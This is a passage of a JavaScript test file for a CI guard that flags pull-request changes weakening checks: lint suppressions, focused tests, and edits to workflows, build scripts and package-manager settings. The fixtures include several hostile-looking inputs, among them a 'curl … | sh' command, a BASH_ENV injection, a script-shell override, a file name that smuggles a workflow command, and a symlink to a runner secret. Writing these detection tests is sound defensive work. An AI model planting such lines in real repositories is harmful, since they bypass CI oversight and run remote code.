  it("when the guard's tests are changed, then their planted patterns are not found", () => {
    const diff = diffOf('scripts/suppression-guard.test.mjs', ["  it.skip('x', () => {}); // eslint-disable-line"]);
    assert.deepEqual(addedSuppressions(diff), []);
  });
});

describe('Given a suppression on an unchanged or removed line', () => {
  it('when the change removes it, then nothing is found', () => {
    const diff = diffOf('backend/src/test/java/ATest.java', ['    void read() {'], { removed: ['    @SuppressWarnings("unchecked")'] });
    assert.deepEqual(addedSuppressions(diff), []);
  });

  it('when the line after it changes, then the finding names only added lines', () => {
    const diff = [
      diffOf('frontend/src/app/a.ts', ['const a = 1;'], { start: 3 }),
      diffOf('frontend/src/app/b.ts', ['const b = 2;', '// eslint-disable-next-line'], { start: 40 }),
    ].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['frontend/src/app/b.ts', 41]]);
  });
});

describe('Given the command line', () => {
  const folders = [];
  afterEach(() => folders.splice(0).forEach((folder) => rmSync(folder, { recursive: true, force: true })));

  function run(diff, body) {
    const folder = mkdtempSync(join(tmpdir(), 'suppression-guard-'));
    folders.push(folder);
    writeFileSync(join(folder, 'diff'), diff);
    writeFileSync(join(folder, 'body'), body);
    return spawnSync(process.execPath, [SCRIPT, `--diff=${join(folder, 'diff')}`, `--declared=${join(folder, 'body')}`], {
      encoding: 'utf8',
      env: { ...process.env, GITHUB_ACTIONS: '' },
    });
  }

  const diff = diffOf('frontend/src/app/a.spec.ts', ["  it.only('when …, then …', () => {"]);

  it('when a suppression is undeclared, then it exits 1 and prints the line that would declare it', () => {
    const result = run(diff, 'Vzhled: beze změny');
    assert.equal(result.status, 1);
    assert.match(result.stdout, /frontend\/src\/app\/a\.spec\.ts:10: it\.only/);
    assert.match(result.stdout, /^Výjimka: frontend\/src\/app\/a\.spec\.ts: <důvod>$/m);
    assert.match(result.stdout, /Výjimky/);
  });

  it('when its line gives no reason, then it exits 1 and says why the line does not count', () => {
    const result = run(diff, 'Výjimka: frontend/src/app/a.spec.ts: <důvod>');
    assert.equal(result.status, 1);
    assert.match(result.stdout, /frontend\/src\/app\/a\.spec\.ts.*(reason|důvod)/i);
  });

  it('when it is declared, then it exits 0 and lists the declaration', () => {
    const result = run(diff, 'Výjimka: frontend/src/app/a.spec.ts: planted for the guard');
    assert.equal(result.status, 0, result.stdout + result.stderr);
    assert.match(result.stdout, /planted for the guard/);
  });

  it('when nothing is suppressed, then it exits 0', () => {
    assert.equal(run(diffOf('frontend/src/app/a.ts', ['const a = 1;']), '').status, 0);
  });

  it('when an option is missing, then it exits 2', () => {
    const result = spawnSync(process.execPath, [SCRIPT], { encoding: 'utf8' });
    assert.equal(result.status, 2);
  });
});

describe('Given a change to the guard itself', () => {
  it('when a line of the guard is added, then the guard needs its own declaration', () => {
    const found = addedSuppressions(diffOf('scripts/suppression-guard.mjs', ['const GUARD_FILES = new Set([]);']));
    assert.deepEqual(located(found), [['scripts/suppression-guard.mjs', 10]]);
  });

  it('when a line of the guard is only removed, then it needs a declaration too', () => {
    const diff = diffOf('scripts/suppression-guard.mjs', [], { removed: ["  { files: JAVA, pattern: /@SuppressWarnings/ },"] });
    assert.deepEqual(located(addedSuppressions(diff)), [['scripts/suppression-guard.mjs', 10]]);
  });
});

function readerOf(files) {
  return (path) => files[path] ?? null;
}

describe('Given a list that relaxes a check spread over several lines', () => {
  const CASES = [
    ['an ESLint ignores list', 'frontend/eslint.config.js', ['export default [', '  {', '    ignores: [', "      'dist/**',", "      'src/legacy/**',", '    ],', '  },', '];'], 5],
    ['an ESLint rule turned off in an array', 'frontend/eslint.config.js', ['    rules: {', "      'max-len': [", "        'off',", '        100,', '      ],', '    },'], 3],
    ['a Stylelint rule turned off in an array', 'frontend/.stylelintrc.json', ['  "rules": {', '    "color-no-hex": [', '      null,', '      { "severity": "warning" }', '    ]', '  }'], 3],
    ['a Stylelint ignoreFiles list', 'frontend/.stylelintrc.json', ['  "ignoreFiles": [', '    "src/legacy/**"', '  ],'], 2],
    ['a Playwright testIgnore list', 'frontend/playwright.config.ts', ['      testIgnore: [', '        /pwa\\//,', '        /slow\\//,', '      ],'], 3],
    ['a Playwright grepInvert list', 'frontend/playwright.config.ts', ['  grepInvert: [', '    /@slow/,', '  ],'], 2],
    ['a Vitest exclude list', 'frontend/vitest.config.mts', ['    exclude: [', "      'src/app/slow.spec.ts',", '    ],'], 2],
    ['an angular.json exclude list', 'frontend/angular.json', ['            "exclude": [', '              "src/app/slow/**"', '            ],'], 2],
  ];
  for (const [what, path, lines, addedLine] of CASES) {
    it(`when only the line inside ${what} is added, then it is found`, () => {
      const diff = diffOf(path, [lines[addedLine - 1]], { start: addedLine });
      const found = addedSuppressions(diff, readerOf({ [path]: `${lines.join('\n')}\n` }));
      assert.deepEqual(located(found), [[path, addedLine]]);
    });
  }

  it('when a line is added to a list that relaxes nothing, then nothing is found', () => {
    const path = 'frontend/eslint.config.js';
    const lines = ['  {', '    files: [', "      'src/**/*.ts',", "      'e2e/**/*.ts',", '    ],', '    rules: {', "      'no-console': [", "        'error',", '      ],', '    },', '  },'];
    const diff = [diffOf(path, [lines[3]], { start: 4 }), diffOf(path, [lines[7]], { start: 8 })].join('\n');
    assert.deepEqual(addedSuppressions(diff, readerOf({ [path]: lines.join('\n') })), []);
  });
});

describe('Given a change to a CI definition', () => {
  const ci = (path, added, options) => addedSuppressions(diffOf(path, added, options));

  it('when a line of a workflow is added, then the file needs a declaration with its count of changed lines', () => {
    const found = ci('.github/workflows/pr-check.yml', ['env:', "  BASH_ENV: '$(printf \"exit 0\" > /tmp/x; echo /tmp/x)'"], { start: 15 });
    assert.deepEqual(
      found.map(({ path, line, kind }) => [path, line, kind]),
      [['.github/workflows/pr-check.yml', 15, 'a change to a CI definition (2 lines)']],
    );
  });

  it('when a workflow only loses lines, then it needs a declaration', () => {
    assert.deepEqual(located(ci('.github/workflows/pr-check.yml', [], { removed: ['      - run: jq -e . <<<"$NEEDS"'] })), [['.github/workflows/pr-check.yml', 10]]);
  });

  it('when a new workflow names a job gate, then it needs a declaration', () => {
    const found = ci('.github/workflows/fast.yml', ['jobs:', '  fake:', '    name: gate', '    steps:', '      - run: "true"'], { status: 'added', start: 1 });
    assert.deepEqual(located(found), [['.github/workflows/fast.yml', 1]]);
  });

  it('when a workflow is deleted, then it needs a declaration', () => {
    assert.deepEqual(located(ci('.github/workflows/nightly.yml', [], { status: 'deleted', removed: ['name: Nightly'] })), [['.github/workflows/nightly.yml', 1]]);
  });

  it('when a workflow is renamed, then it needs a declaration under its old path', () => {
    const diff = ['diff --git a/.github/workflows/nightly.yml b/.github/workflows/nightly-old.yml', 'similarity index 100%', 'rename from .github/workflows/nightly.yml', 'rename to .github/workflows/nightly-old.yml'].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['.github/workflows/nightly.yml', 1]]);
  });

  it('when a workflow is moved out of the workflows folder, then it needs a declaration', () => {
    const diff = ['diff --git a/.github/workflows/pr-check.yml b/docs/pr-check.yml', 'similarity index 100%', 'rename from .github/workflows/pr-check.yml', 'rename to docs/pr-check.yml'].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['.github/workflows/pr-check.yml', 1]]);
  });

  it('when a local action changes, then it needs a declaration', () => {
    assert.deepEqual(located(ci('.github/actions/setup/action.yml', ['    - run: exit 0'], { start: 7 })), [['.github/actions/setup/action.yml', 7]]);
  });

  it('when a workflow line also matches a suppression pattern, then the file is still one finding', () => {
    const found = ci('.github/workflows/pr-check.yml', ['        continue-on-error: true', '          npm test || true', '  # eslint-disable'], { start: 30 });
    assert.equal(found.length, 1);
  });

  it('when the declaration names the workflow, then it passes', () => {
    const found = ci('.github/workflows/pr-check.yml', ['        timeout-minutes: 10'], { start: 30 });
    const body = 'Výjimka: .github/workflows/pr-check.yml: the job needs more time on a cold cache';
    assert.deepEqual(undeclaredSuppressions(found, declared(body)), []);
  });

  it('when another file under .github changes, then it is judged by its lines only', () => {
    assert.deepEqual(ci('.github/pull_request_template.md', ['Výjimka: <!-- path: reason -->']), []);
  });
});

describe('Given the scripts of a package.json', () => {
  const PACKAGE = [
    '{',
    '  "name": "frontend",',
    '  "version": "1.0.0",',
    '  "scripts": {',
    '    "pretest": "exit 0",',
    '    "lint": "true",',
    '    "test": "ng test; exit 0"',
    '  },',
    '  "devDependencies": {',
    '    "vitest": "4.0.1"',
    '  }',
    '}',
  ].join('\n');
  const reader = (path) => readerOf({ [path]: PACKAGE });
  const CASES = [
    ['a pre-script that exits 0', 'frontend/package.json', 5],
    ['a lint script that does nothing', 'frontend/package.json', 6],
    ['a test script whose failure is dropped', 'frontend/package.json', 7],
    ['a check script of the connector that does nothing', 'mcp/package.json', 6],
  ];
  for (const [what, path, line] of CASES) {
    it(`when ${what} is added, then it is found`, () => {
      const found = addedSuppressions(diffOf(path, [PACKAGE.split('\n')[line - 1]], { start: line }), reader(path));
      assert.deepEqual(located(found), [[path, line]]);
    });
  }

  it('when a version or a dependency changes, then nothing is found', () => {
    const lines = PACKAGE.split('\n');
    const diff = [diffOf('frontend/package.json', [lines[2]], { start: 3 }), diffOf('frontend/package.json', [lines[9]], { start: 10 })].join('\n');
    assert.deepEqual(addedSuppressions(diff, reader('frontend/package.json')), []);
  });
});

describe('Given a removed line that kept a check strict', () => {
  const REMOVED = [
    ['forbidOnly', 'frontend/playwright.config.ts', '  forbidOnly: !!process.env.CI,'],
    ['failOnFlakyTests', 'frontend/playwright.config.ts', '  failOnFlakyTests: !!process.env.CI,'],
    ["an ESLint rule at 'error'", 'frontend/eslint.config.js', "      '@angular-eslint/prefer-signals': 'error',"],
    ['an ESLint rule at "error" in an array', 'frontend/eslint.config.js', '      "max-len": ["error", 120],'],
    ['strict in a tsconfig', 'frontend/tsconfig.json', '    "strict": true,'],
    ['strictTemplates in a tsconfig', 'frontend/tsconfig.json', '    "strictTemplates": true,'],
    ['noUnusedLocals in a tsconfig', 'mcp/tsconfig.json', '    "noUnusedLocals": true,'],
    ['--max-warnings in a package.json', 'frontend/package.json', '    "lint:styles": "stylelint --max-warnings 0 src/**/*.scss",'],
  ];
  for (const [what, path, line] of REMOVED) {
    it(`when ${what} is removed, then it is found`, () => {
      assert.deepEqual(located(addedSuppressions(diffOf(path, [], { removed: [line] }))), [[path, 10]]);
    });
  }

  it('when an unrelated config line is removed, then nothing is found', () => {
    assert.deepEqual(addedSuppressions(diffOf('frontend/playwright.config.ts', [], { removed: ["  reporter: 'list',"] })), []);
  });
});

describe('Given a change to a script that writes to GitHub with the workflows\' token', () => {
  it('when scripts/pr-labels.mjs changes, then it needs a declaration', () => {
    const found = addedSuppressions(diffOf('scripts/pr-labels.mjs', ['  await github.rest.pulls.update({ state: \'closed\' });'], { start: 20 }));
    assert.deepEqual(
      found.map(({ path: file, line, kind }) => [file, line, kind]),
      [['scripts/pr-labels.mjs', 20, "a change to a script that writes to GitHub with the workflows' token (1 line)"]],
    );
  });
});

describe('Given a change to a script that decides a required check', () => {
  const SCRIPTS = [
    'scripts/compare-v2.mjs',
    'scripts/compare-v2-baseline.mjs',
    'scripts/compare-screens.mjs',
    'scripts/compare-recordings.mjs',
    'scripts/test-inventory.mjs',
    'scripts/png-pixels.mjs',
    'scripts/stack-journey.mjs',
    'scripts/backend-log.sh',
    'scripts/fake-fio.mjs',
    'frontend/scripts/check-e2e-shards.mjs',
    'frontend/scripts/check-receipt-chunks.mjs',
    'frontend/scripts/check-themes.mjs',
    'frontend/scripts/needs-connection.mjs',
    'frontend/scripts/pinned-libraries.mjs',
    'frontend/scripts/stylelint-hover-media.mjs',
    'frontend/scripts/probe-edge-caching.mjs',
    'frontend/scripts/probe-asset-caching.mjs',
    'frontend/scripts/security-headers.mjs',
    'frontend/scripts/immutable-locations.mjs',
    'frontend/scripts/app-routes.mjs',
    'frontend/scripts/serve-dist.mjs',
    'frontend/scripts/dev-port.mjs',
    'frontend/eslint-confinement.js',
    'scripts/agent-context-budget.mjs',
    'mcp/src/tool-list.ts',
  ];
  for (const path of SCRIPTS) {
    it(`when ${path} changes, then it needs a declaration`, () => {
      const found = addedSuppressions(diffOf(path, ['  return [];'], { start: 20 }));
      assert.deepEqual(
        found.map(({ path: file, line, kind }) => [file, line, kind]),
        [[path, 20, 'a change to a script that decides a required check (1 line)']],
      );
    });
  }

  it('when one only loses lines, then it needs a declaration', () => {
    assert.equal(addedSuppressions(diffOf('scripts/compare-v2.mjs', [], { removed: ['  if (undeclared.length > 0) return 1;'] })).length, 1);
  });

  it('when one is deleted, then it needs a declaration', () => {
    assert.deepEqual(located(addedSuppressions(diffOf('frontend/scripts/check-e2e-shards.mjs', [], { status: 'deleted', removed: ['export {};'] }))), [['frontend/scripts/check-e2e-shards.mjs', 1]]);
  });

  it('when its tests change, then they are judged by their lines only', () => {
    assert.deepEqual(addedSuppressions(diffOf('scripts/compare-v2.test.mjs', ["  it('when …, then …', () => {});"])), []);
  });
});

describe('Given a change to the build definition', () => {
  const FILES = [
    'backend/settings.gradle.kts',
    'settings.gradle',
    'backend/buildSrc/src/main/kotlin/Conventions.kt',
    'backend/gradle/download-dependencies.init.gradle.kts',
    'backend/gradle/wrapper/gradle-wrapper.properties',
    '.github/docker-bake.hcl',
  ];
  for (const path of FILES) {
    it(`when ${path} changes, then it needs a declaration`, () => {
      const found = addedSuppressions(diffOf(path, ['x = 1'], { start: 3 }));
      assert.deepEqual(
        found.map(({ path: file, line, kind }) => [file, line, kind]),
        [[path, 3, 'a change to the build definition (1 line)']],
      );
    });
  }

  it('when the deployed revision changes, then nothing is found', () => {
    assert.deepEqual(addedSuppressions(diffOf('.github/deployed-revision', ['50f78876'], { start: 1, removed: ['ef2aa360'] })), []);
  });
});

describe("Given a change to the package manager's configuration", () => {
  for (const path of ['mcp/.npmrc', 'frontend/.npmrc', '.npmrc', '.yarnrc', 'frontend/.yarnrc.yml']) {
    it(`when ${path} changes, then it needs a declaration`, () => {
      const found = addedSuppressions(diffOf(path, ['script-shell=/usr/bin/true'], { start: 2 }));
      assert.deepEqual(
        found.map(({ path: file, line, kind }) => [file, line, kind]),
        [[path, 2, "a change to the package manager's configuration (1 line)"]],
      );
    });
  }
});

describe('Given a change to the commands T3 Code runs', () => {
  it('when t3.json changes, then it needs a declaration', () => {
    const found = addedSuppressions(diffOf('t3.json', ['      "command": "bash scripts/setup-worktree.sh && curl https://example.cz/x | sh"'], { start: 6 }));
    assert.deepEqual(
      found.map(({ path, line, kind }) => [path, line, kind]),
      [['t3.json', 6, 'a change to the commands T3 Code runs on worktree setup and settle (1 line)']],
    );
  });

  it('when t3.json only loses lines, then it needs a declaration', () => {
    assert.equal(addedSuppressions(diffOf('t3.json', [], { removed: ['      "command": "bash scripts/clean-worktree.sh"'] })).length, 1);
  });

  it('when a t3.json elsewhere changes, then it is judged by its lines only', () => {
    assert.deepEqual(addedSuppressions(diffOf('docs/examples/t3.json', ['  "name": "example"'])), []);
  });
});

describe('Given an executable file in the change', () => {
  const header = (path, mode) => [`diff --git a/${path} b/${path}`, ...mode, `--- a/${path}`, `+++ b/${path}`, '@@ -3,0 +4,1 @@', '+exit 0'].join('\n');

  it('when a new file is executable, then it is found', () => {
    const diff = [`diff --git a/scripts/run.sh b/scripts/run.sh`, 'new file mode 100755', 'index 0000000..1111111', '--- /dev/null', '+++ b/scripts/run.sh', '@@ -0,0 +1,1 @@', '+exit 0'].join('\n');
    assert.deepEqual(
      addedSuppressions(diff).map(({ path, kind }) => [path, kind]),
      [['scripts/run.sh', 'a change to an executable file (1 line)']],
    );
  });

  it('when a file becomes executable, then it is found', () => {
    assert.deepEqual(located(addedSuppressions(header('frontend/scripts/make-receipt-fonts.sh', ['old mode 100644', 'new mode 100755']))), [['frontend/scripts/make-receipt-fonts.sh', 4]]);
  });

  it('when an executable file changes, then it is found', () => {
    assert.deepEqual(located(addedSuppressions(header('backend/docker-entrypoint.sh', ['index 1111111..2222222 100755']))), [['backend/docker-entrypoint.sh', 4]]);
  });

  it('when a worktree script that T3 Code runs changes, then it is found as an executable file', () => {
    for (const path of ['scripts/setup-worktree.sh', 'scripts/install-node-modules.sh', 'scripts/clean-worktree.sh']) {
      assert.deepEqual(located(addedSuppressions(header(path, ['index 1111111..2222222 100755']))), [[path, 4]], path);
    }
  });

  it('when an ordinary file changes, then it is judged by its lines', () => {
    assert.deepEqual(addedSuppressions(header('scripts/notes.txt', ['index 1111111..2222222 100644'])), []);
  });

  it('when an executable file is a script that decides a check, then it is reported as that script', () => {
    const found = addedSuppressions(header('scripts/backend-log.sh', ['index 1111111..2222222 100755']));
    assert.deepEqual(found.map(({ kind }) => kind), ['a change to a script that decides a required check (1 line)']);
  });
});

describe('Given a change to the files that run the guard', () => {
  it('when the suppressions workflow changes, then it needs a declaration', () => {
    const diff = diffOf('.github/workflows/suppressions.yml', ['          node base/scripts/suppression-guard.mjs || true'], { start: 40 });
    assert.deepEqual(located(addedSuppressions(diff)), [['.github/workflows/suppressions.yml', 40]]);
  });

  it('when the suppressions workflow is deleted, then it needs a declaration', () => {
    const diff = diffOf('.github/workflows/suppressions.yml', [], { status: 'deleted', removed: ['name: Výjimky'] });
    assert.deepEqual(located(addedSuppressions(diff)), [['.github/workflows/suppressions.yml', 1]]);
  });

  it('when the guard is deleted, then it needs a declaration', () => {
    const diff = diffOf('scripts/suppression-guard.mjs', [], { status: 'deleted', removed: ['#!/usr/bin/env node'] });
    assert.deepEqual(located(addedSuppressions(diff)), [['scripts/suppression-guard.mjs', 1]]);
  });
});

describe('Given a test file renamed', () => {
  const moved = (from, to) => [`diff --git a/${from} b/${to}`, 'similarity index 100%', `rename from ${from}`, `rename to ${to}`].join('\n');
  const RETIRED = [
    ['a spec to a name no runner picks up', 'frontend/src/app/a.spec.ts', 'frontend/src/app/a.spek.ts'],
    ['a feature to a text file', 'backend/src/test/resources/features/donors/a.feature', 'backend/src/test/resources/features/donors/a.feature.txt'],
    ['a Java test class to another suffix', 'backend/src/test/java/a/ATest.java', 'backend/src/test/java/a/ACheck.java'],
    ['a node test to a plain script', 'scripts/a.test.mjs', 'scripts/a.mjs'],
  ];
  for (const [what, from, to] of RETIRED) {
    it(`when it turns ${what}, then it is found`, () => {
      assert.deepEqual(located(addedSuppressions(moved(from, to))), [[to, 1]]);
    });
  }

  it('when it moves and stays a test, then nothing is found', () => {
    assert.deepEqual(addedSuppressions(moved('frontend/src/app/a.spec.ts', 'frontend/src/app/b/a.spec.ts')), []);
  });
});

describe('Given a change that git would show as binary', () => {
  it('when the diff says a file is binary, then it is found', () => {
    const diff = ['diff --git a/frontend/src/app/a.spec.ts b/frontend/src/app/a.spec.ts', 'index 1111111..2222222 100644', 'Binary files a/frontend/src/app/a.spec.ts and b/frontend/src/app/a.spec.ts differ'].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['frontend/src/app/a.spec.ts', 1]]);
  });

  it('when the diff carries a binary patch, then it is found', () => {
    const diff = ['diff --git a/backend/src/test/java/ATest.java b/backend/src/test/java/ATest.java', 'index 1111111..2222222 100644', 'GIT binary patch', 'literal 12', 'zcmZ?wbhEHbG-B{z3Re'].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['backend/src/test/java/ATest.java', 1]]);
  });
});

describe('Given a change to the guard or its workflow under another name', () => {
  const moved = (kind, from, to, similarity = 100) => [`diff --git a/${from} b/${to}`, `similarity index ${similarity}%`, `${kind} from ${from}`, `${kind} to ${to}`].join('\n');
  const CASES = [
    ['the workflow renamed', 'rename', '.github/workflows/suppressions.yml', '.github/workflows/suppressions-old.yml'],
    ['the workflow copied', 'copy', '.github/workflows/suppressions.yml', '.github/workflows/other.yml'],
    ['the guard renamed', 'rename', 'scripts/suppression-guard.mjs', 'scripts/old-guard.mjs'],
    ['the guard copied', 'copy', 'scripts/suppression-guard.mjs', 'scripts/guard-copy.mjs'],
    ['the guard renamed onto its tests', 'rename', 'scripts/suppression-guard.mjs', 'scripts/suppression-guard.test.mjs'],
  ];
  for (const [what, kind, from, to] of CASES) {
    it(`when ${what}, then it needs a declaration of the protected file`, () => {
      assert.deepEqual(located(addedSuppressions(moved(kind, from, to))), [[from, 1]]);
    });
  }

  it('when another file is moved onto the path of the guard tests, then its lines are judged', () => {
    const diff = [
      moved('rename', 'frontend/src/app/a.spec.ts', 'scripts/suppression-guard.test.mjs', 90),
      '--- a/frontend/src/app/a.spec.ts',
      '+++ b/scripts/suppression-guard.test.mjs',
      '@@ -3,0 +4,1 @@',
      "+  it.only('when …, then …', () => {",
    ].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['scripts/suppression-guard.test.mjs', 4]]);
  });
});

describe('Given a symbolic link in the change', () => {
  it('when a new file is a symbolic link, then it is found', () => {
    const diff = ['diff --git a/frontend/eslint.config.js b/frontend/eslint.config.js', 'new file mode 120000', 'index 0000000..1111111', '--- /dev/null', '+++ b/frontend/eslint.config.js', '@@ -0,0 +1 @@', '+../../elsewhere/eslint.config.js', '\\ No newline at end of file'].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['frontend/eslint.config.js', 1]]);
  });

  it('when a file turns into a symbolic link, then it is found', () => {
    const diff = ['diff --git a/frontend/playwright.config.ts b/frontend/playwright.config.ts', 'old mode 100644', 'new mode 120000', '--- a/frontend/playwright.config.ts', '+++ b/frontend/playwright.config.ts', '@@ -1,2 +1 @@', '-export default {};', '+/etc/hosts'].join('\n');
    assert.deepEqual(located(addedSuppressions(diff)), [['frontend/playwright.config.ts', 1]]);
  });
});

describe('Given the change read from its folder', () => {
  const folders = [];
  afterEach(() => folders.splice(0).forEach((folder) => rmSync(folder, { recursive: true, force: true })));

  function layout() {
    const base = mkdtempSync(join(tmpdir(), 'suppression-guard-reader-'));
    folders.push(base);
    mkdirSync(join(base, 'head/frontend'), { recursive: true });
    writeFileSync(join(base, 'outside.txt'), 'secret of the runner');
    writeFileSync(join(base, 'head/frontend/eslint.config.js'), 'export default [];');
    symlinkSync(join(base, 'outside.txt'), join(base, 'head/frontend/linked.js'));
    return readerFor(join(base, 'head'));
  }

  it('when the path is a regular file inside, then its text is read', () => {
    assert.equal(layout()('frontend/eslint.config.js'), 'export default [];');
  });

  it('when the path is a symbolic link, then nothing is read', () => {
    assert.equal(layout()('frontend/linked.js'), null);
  });

  it('when the path leaves the folder, then nothing is read', () => {
    assert.equal(layout()('../outside.txt'), null);
  });

  it('when the path is a folder, then nothing is read', () => {
    assert.equal(layout()('frontend'), null);
  });
});

describe('Given a file name that carries workflow commands', () => {
  const folders = [];
  afterEach(() => folders.splice(0).forEach((folder) => rmSync(folder, { recursive: true, force: true })));

  function run(diff) {
    const folder = mkdtempSync(join(tmpdir(), 'suppression-guard-names-'));
    folders.push(folder);
    writeFileSync(join(folder, 'diff'), diff);
    writeFileSync(join(folder, 'body'), '');
    return spawnSync(process.execPath, [SCRIPT, `--diff=${join(folder, 'diff')}`, `--declared=${join(folder, 'body')}`], {
      encoding: 'utf8',
      env: { ...process.env, GITHUB_ACTIONS: 'true' },
    });
  }

  const quoted = '"b/frontend/src/app/a\\n::add-mask::x%,:.spec.ts"';
  const diff = ['diff --git "a/frontend/src/app/a\\n::add-mask::x%,:.spec.ts" ' + quoted, '--- ' + quoted.replace('"b/', '"a/'), '+++ ' + quoted, '@@ -1,0 +1,1 @@', "+it.only('x', () => {});"].join('\n');

  it('when it holds a new line, then it is a finding of its own', () => {
    const found = addedSuppressions(diff);
    assert.ok(found.some(({ kind }) => /control character/.test(kind)), JSON.stringify(found));
  });

  it('when it is printed, then no line starts a command but the guard\'s own error annotations, each escaped', () => {
    const result = run(diff);
    assert.equal(result.status, 1);
    const commands = result.stdout.split('\n').filter((line) => line.startsWith('::'));
    assert.ok(commands.length > 0);
    for (const line of commands) {
      assert.match(line, /^::error file=[^:,\n]*,line=\d+::/);
    }
    assert.doesNotMatch(result.stdout, /^::add-mask::/m);
    assert.match(result.stdout, /%0A/);
    assert.match(result.stdout, /%25/);
  });
});

describe('Given a real repository that hides a change from a plain diff', () => {
  const folders = [];
  afterEach(() => folders.splice(0).forEach((folder) => rmSync(folder, { recursive: true, force: true })));

  function repository(files) {
    const root = mkdtempSync(join(tmpdir(), 'suppression-guard-binary-'));
    folders.push(root);
    const git = (...args) => {
      const result = spawnSync('git', ['-c', 'user.name=guard', '-c', 'user.email=guard@example.cz', ...args], { cwd: root, encoding: 'utf8' });
      assert.equal(result.status, 0, result.stderr);
      return result.stdout;
    };
    const write = (path, text) => {
      mkdirSync(dirname(join(root, path)), { recursive: true });
      writeFileSync(join(root, path), text);
    };
    git('init', '-q');
    write('src/a.spec.ts', "it('when …, then …', () => {});\n");
    git('add', '-A');
    git('commit', '-q', '-m', 'base');
    for (const [path, text] of Object.entries(files)) write(path, text);
    git('add', '-A');
    git('commit', '-q', '-m', 'change');
    return git('-c', 'core.quotePath=false', 'diff', '--text', '--no-ext-diff', '--no-textconv', '--unified=0', 'HEAD^1', 'HEAD');
  }

  it('when .gitattributes marks the specs as binary, then the diff the workflow takes still shows the focused test', () => {
    const diff = repository({ '.gitattributes': '*.spec.ts -diff\n', 'src/a.spec.ts': "it.only('when …, then …', () => {});\n" });
    assert.deepEqual(
      addedSuppressions(diff).map(({ path }) => path).sort(),
      ['.gitattributes', 'src/a.spec.ts'],
    );
  });

  it('when a NUL byte makes the spec binary, then the diff the workflow takes still shows the focused test', () => {
    const diff = repository({ 'src/a.spec.ts': "it.only('when …, then …', () => {}); // \u0000\n" });
    assert.deepEqual(located(addedSuppressions(diff)), [['src/a.spec.ts', 1]]);
  });
});

describe('Given the command line with the checkout as its root', () => {
  const folders = [];
  afterEach(() => folders.splice(0).forEach((folder) => rmSync(folder, { recursive: true, force: true })));

  it('when an added line stands inside an ESLint ignores list of the checkout, then it exits 1', () => {
    const root = mkdtempSync(join(tmpdir(), 'suppression-guard-root-'));
    folders.push(root);
    mkdirSync(join(root, 'frontend'));
    writeFileSync(join(root, 'frontend/eslint.config.js'), "export default [\n  {\n    ignores: [\n      'src/legacy/**',\n    ],\n  },\n];\n");
    writeFileSync(join(root, 'diff'), diffOf('frontend/eslint.config.js', ["      'src/legacy/**',"], { start: 4 }));
    writeFileSync(join(root, 'body'), '');
    const result = spawnSync(process.execPath, [SCRIPT, `--diff=${join(root, 'diff')}`, `--declared=${join(root, 'body')}`, `--root=${root}`], {
      encoding: 'utf8',
      env: { ...process.env, GITHUB_ACTIONS: '' },
    });
    assert.equal(result.status, 1, result.stdout);
    assert.match(result.stdout, /frontend\/eslint\.config\.js:4: /);
  });
});
